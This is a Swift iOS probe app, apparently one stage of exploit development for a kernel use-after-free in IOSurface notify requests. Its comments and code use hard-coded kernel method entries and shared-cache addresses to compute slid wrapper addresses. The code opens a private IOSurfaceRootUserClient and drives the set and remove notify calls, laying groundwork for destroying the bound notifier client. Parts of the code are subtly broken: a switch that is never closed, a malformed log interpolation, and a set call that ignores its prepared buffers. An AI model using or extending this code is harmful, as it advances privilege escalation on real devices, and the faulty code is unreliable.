// AGXProbe v96 - private IOSurfaceRootUserClient connection
//
// Goal: get a NOT the shared IOSurfaceRoot connection, but our OWN
// IOServiceOpen()ed one, so that the per-connection notifier client can be
// destroyed on demand.  That is the object the notify request is bound to
// (request+0x58), and the 27.0.1 UAF is exactly "request outlives its bound
// notifier client".
//
// Static facts (see analysis/iosurface-notify-uaf-CVE-2026-112477.md):
//   IOSurfaceRootUserClient external methods live in __DATA_CONST of
//   com.apple.iokit.IOSurface, 40 bytes per entry.
//     entry fn 0xfffffe000a3498f4  = set surface notify
//          scalarIn=0 structIn=24 scalarOut=1 structOut=0
//     entry fn 0xfffffe000a34991c  = remove surface notify
//          scalarIn=0 structIn=24
//
// User space (dyld shared cache, IOSurface image):
//   _IOSurfaceClientSetSurfaceNotify     dsc vm 0x1c284a6e8
//   _IOSurfaceClientRemoveSurfaceNotify  dsc vm 0x1c2851390
//
// The framework reaches IOKit through two wrapper functions living in another
// shared-cache image:
//   set    -> 0x1c811c2b0   (conn, 0x11, port, &in24, 3, 0, 0, &out24, 24)
//   remove -> 0x1c810a5e0   (conn, 0x12, 0, 0, &in24, 0x18, 0, 0)
//
// All images of one dyld shared cache share ONE slide, so the runtime address
// of those wrappers can be derived from any known symbol in the cache:
//   runtime(x) = runtime(_IOSurfaceClientSetSurfaceNotify) + (x - 0x1c284a6e8)
// We then call the very same wrappers with OUR connection, so the kernel does
// exactly what it does for the framework - only on a private client.
//
// Everything below runs on the 13 Pro only.

import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v96 - private IOSurface conn").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v96")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    // ---- IOKit entry points (declared locally to avoid depending on XPCProbe) ----
    @_silgen_name("IOServiceMatching")
    func p_IOServiceMatching(_ name: UnsafePointer<CChar>) -> UnsafeMutableRawPointer?
    @_silgen_name("IOServiceGetMatchingServices")
    func p_IOServiceGetMatchingServices(_ port: mach_port_t, _ matching: UnsafeMutableRawPointer?,
                                       _ existing: UnsafeMutablePointer<io_iterator_t>) -> kern_return_t
    @_silgen_name("IOIteratorNext")
    func p_IOIteratorNext(_ it: io_iterator_t) -> io_service_t
    @_silgen_name("IOServiceOpen")
    func p_IOServiceOpen(_ svc: io_service_t, _ task: mach_port_t, _ type: UInt32,
                         _ conn: UnsafeMutablePointer<io_connect_t>) -> kern_return_t
    @_silgen_name("IOServiceClose")
    func p_IOServiceClose(_ conn: io_connect_t) -> kern_return_t
    @_silgen_name("IOObjectRelease")
    func p_IOObjectRelease(_ obj: UInt32) -> kern_return_t

    typealias SetWrap = @convention(c) (UInt32, UInt32, UInt64, UnsafeRawPointer?, UInt32,
                                        UInt64, UInt64, UnsafeRawPointer?, UInt32) -> Int32
    typealias RemWrap = @convention(c) (UInt32, UInt32, UInt64, UInt64, UnsafeRawPointer?,
                                        UInt64, UInt64, UInt64) -> Int32

    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v96 - private IOSurfaceRootUserClient ===")
        try? await Task.sleep(nanoseconds: 2_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }
        let gSet = unsafeBitCast(setSym, to: SetNotifyFn.self)
        let gRemove = unsafeBitCast(remSym, to: RemoveNotifyFn.self)
        let gCreate = unsafeBitCast(createSym, to: CreateFn.self)
        let gGetID = unsafeBitCast(getIdSym, to: GetIDFn.self)

        func krName(_ kr: kern_return_t) -> String {
            switch kr {
            case KERN_SUCCESS: return "OK"
            case Int32(bitPattern: 0xe00002bd): return "NoMemory"
            case Int32(bitPattern: 0xe00002c2): return "BadArgument"
            case Int32(bitPattern: 0xe00002c9): return "Duplicate/Exists"
            case Int32(bitPattern: 0xe00002d8): return "NotAttached(27.2 guard)"
            default: return String(format: "0x%08x", UInt32(bitPattern: kr))
        }
        func makeSurface(w: Int, h: Int) -> UnsafeMutableRawPointer? {
            var keyCB = kCFTypeDictionaryKeyCallBacks
            var valCB = kCFTypeDictionaryValueCallBacks
            let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
            props["IOSurfaceWidth"] = w
            props["IOSurfaceHeight"] = h
            props["IOSurfaceBytesPerElement"] = 4
            return gCreate(props)
        }

        // ---- 1. locate the shared-cache wrappers -------------------------------
        emit("\n=== 1. shared-cache wrapper addresses ===")
        var infoIOS = Dl_info()
        var infoIOK = Dl_info()
        _ = dladdr(setSym, &infoIOS)
        let iokSym = dlsym(RTLD_DEFAULT, "IOConnectCallMethod")
        if iokSym != nil { _ = dladdr(iokSym, &infoIOK) }

        let dscSetSym = UInt64(0x1c284a6e8)
        let dscSetWrap = UInt64(0x1c811c2b0)
        let dscRemWrap = UInt64(0x1c810a5e0)

        guard infoIOS.dli_saddr != nil else {
            emit("[-] dladdr failed for IOSurfaceClientSetSurfaceNotify")
            status = "Complete"; isRunning = false; return
        }
        let runtimeSetSym = UInt64(bitPattern: infoIOS.dli_saddr)
        emit("IOSurface image base  = 0x\(String(UInt64(bitPattern: infoIOS.dli_fbase), radix: 16))")
        emit("set_notify runtime   = 0x\(String(runtimeSetSym, radix: 16))")
        if iokSym != nil, infoIOK.dli_saddr != nil {
            emit("IOConnectCallMethod  = 0x\(String(UInt64(bitPattern: infoIOK.dli_saddr), radix: 16))  (name \(infoIOK.dli_sname.map { String(cString: $0) } ?? "?"))")
        }
        let setWrapAddr = runtimeSetSym &+ (dscSetWrap &- dscSetSym)
        let remWrapAddr = runtimeSetSym &+ (dscRemWrap &- dscSetSym)
        emit("computed set wrapper = 0x\(String(setWrapAddr, radix: 16))   (dsc 0x1c811c2b0)")
        emit("computed rem wrapper = 0x\(String(remWrapAddr, radix: 16))   (dsc 0x1c810a5e0)")
        if iokSym != nil, infoIOK.dli_saddr != nil {
            let delta = Int64(bitPattern: UInt64(bitPattern: infoIOK.dli_saddr)) &- Int64(bitPattern: setWrapAddr)
            emit("delta(IOConnectCallMethod - computed set wrapper) = \(delta)")
        }

        // ---- 2. open our own IOSurfaceRootUserClient --------------------------
        emit("\n=== 2. open private IOSurfaceRootUserClient ===")
        var iter: io_iterator_t = 0
        let matchName = "IOSurfaceRoot"
        var kr = matchName.withCString { p_IOServiceGetMatchingServices(mach_task_self(), p_IOServiceMatching($0), &iter) }
        emit("IOServiceGetMatchingServices -> \(krName(kr))")
        guard kr == KERN_SUCCESS else { status = "Complete"; isRunning = false; return }
        let svc = p_IOIteratorNext(iter)
        emit("service = 0x\(String(svc, radix: 16))")
        var conn: io_connect_t = 0
        kr = p_IOServiceOpen(svc, mach_task_self(), 0, &conn)
        emit("IOServiceOpen -> \(krName(kr)) conn=0x\(String(conn, radix: 16))")
        guard kr == KERN_SUCCESS else { status = "Complete"; isRunning = false; return }

        // ---- 3. notify port ----------------------------------------------------
        var port: mach_port_t = 0
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port)
        emit("notify port 0x\(String(port, radix: 16)) kr=\(krName(kr))")

        // ---- 4. control: shared connection ------------------------------------
        emit("\n=== 4. control - shared connection ===")
        guard let s0 = makeSurface(w: 64, h: 64) else { emit("[-] create failed"); status = "Complete"; isRunning = false; return }
        let id0 = gGetID(s0)
        emit("[shared] surface id 0x\(String(id0, radix: 16))")
        emit("[shared] set(port,1,id) -> \(krName(gSet(port, 1, UInt64(id0))))")
        emit("[shared] remove(id)   -> \(krName(gRemove(UInt64(id0))))")
        Unmanaged<AnyObject>.fromOpaque(s0).release()

        // ---- 5. private connection: set / remove ------------------------------
        emit("\n=== 5. private connection - set/remove ===")
        guard let s1 = makeSurface(w: 80, h: 80) else { emit("[-] create failed"); status = "Complete"; isRunning = false; return }
        let id1 = gGetID(s1)
        emit("[priv] surface id 0x\(String(id1, radix: 16))")

        let setWrap = unsafeBitCast(setWrapAddr, to: SetWrap.self)
        let remWrap = unsafeBitCast(remWrapAddr, to: RemWrap.self)

        // framework layout: in24 = {0, type, surfaceID}
        var inSet: (UInt64, UInt64, UInt64) = (0, 1, UInt64(id1))
        var outSet: (UInt64, UInt64, UInt64) = (0, 0, 0)
        var outSize: UInt32 = 24
        let krSet = setWrap(conn, 0x11, UInt64(port), nil, 3, 0, 0, nil, 0)
        emit("[priv] set wrapper   -> \(krName(krSet))   out={outSet.0},\(outSet.1),\(outSet.2)}")

        // remove layout: in24 = {0, surfaceID, 0}
        var inRem: (UInt64, UInt64, UInt64) = (0, UInt64(id1), 0)
        let krRem = withUnsafePointer(to: &inRem) { ip in
            remWrap(conn, 0x12, 0, 0, UnsafeRawPointer(ip), 0x18, 0, 0)
        }
        emit("[priv] remove wrapper -> \(krName(krRem))")

        let krRem2 = withUnsafePointer(to: &inRem) { ip in
            remWrap(conn, 0x12, 0, 0, UnsafeRawPointer(ip), 0x18, 0, 0)
        }
        emit("[priv] remove again   -> \(krName(krRem2))  (BadArgument == nothing was registered)")

        // ---- 6. cross-check with the shared connection ------------------------
        emit("\n=== 6. cross-check ===")
        emit("[shared] set(port,1,id1) on the SAME id -> \(krName(gSet(port, 1, UInt64(id1))))")
        emit("[shared] remove(id1) -> \(krName(gRemove(UInt64(id1))))")

        Unmanaged<AnyObject>.fromOpaque(s1).release()
        _ = p_IOServiceClose(conn)
        emit("\n[priv] connection closed")
        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}

// mach_task_self is not exposed by the Darwin module on iOS
@_silgen_name("mach_task_self")
func mach_task_self() -> mach_port_t
